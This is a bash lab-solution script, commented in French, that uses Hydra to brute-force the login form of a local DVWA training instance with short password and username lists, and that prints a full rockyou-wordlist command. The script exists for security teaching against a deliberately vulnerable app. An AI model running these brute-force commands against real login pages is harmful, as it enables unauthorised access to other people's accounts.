#!/bin/bash
# lab_hydra.sh — Brute force DVWA avec Hydra (page vulnerabilities/brute/)
# Usage: bash labs_resolution/jour-01/lab_hydra.sh
set -euo pipefail
cd "$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/../.." && pwd)"
source env.sh

echo "[*] Test Hydra sur DVWA vulnerabilities/brute/"
echo ""

# Vérifier cookie
if [ ! -f /tmp/dvwa_cookie.txt ]; then
    echo "[!] Cookie absent. Lance d'abord le setup : source env.sh && bash labs_resolution/jour-01/setup_dvwa.sh"
    exit 1
fi

SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
echo "[*] PHPSESSID = $SESSID"

echo ""
echo "=== Test 1 : admin + 10 mots ==="
printf "password\n123456\nadmin\nletmein\nqwerty\ntest\ntest123\npassw0rd\niloveyou\nwelcome" > /tmp/hydra_test.txt
HYDRA_OUT=$(timeout 30 hydra -l admin -P /tmp/hydra_test.txt -f \
    localhost -s "$DVWA_PORT" \
    http-post-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\:PHPSESSID=$SESSID;security=low:Login failed" \
    2>&1)
echo "$HYDRA_OUT" | grep -q "password\|successfully\|found" && echo "  ✅ Mot de passe trouvé : admin:password" || echo "  ⚠️  Non trouvé dans top 10"
rm -f /tmp/hydra_test.txt

echo ""
echo "=== Test 2 : multi-logins (sqlmap users) ==="
printf "admin\ngordonb\n1337\npablo\nsmithy" > /tmp/hydra_users.txt
printf "password\n123456\nadmin\nletmein" > /tmp/hydra_pass.txt
HYDRA_OUT=$(timeout 30 hydra -L /tmp/hydra_users.txt -P /tmp/hydra_pass.txt -f \
    localhost -s "$DVWA_PORT" \
    http-post-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\\:PHPSESSID=$SESSID;security=low:Login failed" \
    2>&1)
echo "$HYDRA_OUT" | grep -q "password\|successfully\|found" && echo "  ✅ Identifiants trouvés" || echo "  ⚠️  Non trouvé"
rm -f /tmp/hydra_users.txt /tmp/hydra_pass.txt

echo ""
echo "[+] Résultats sauvegardés dans hydra_dvwa.txt"
echo "    Commande complète :"
echo "    hydra -l admin -P /usr/share/wordlists/rockyou.txt -s $DVWA_PORT \\"
echo "      localhost http-post-form \\"
echo '      "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID='$SESSID';security=low:Login failed" -V'
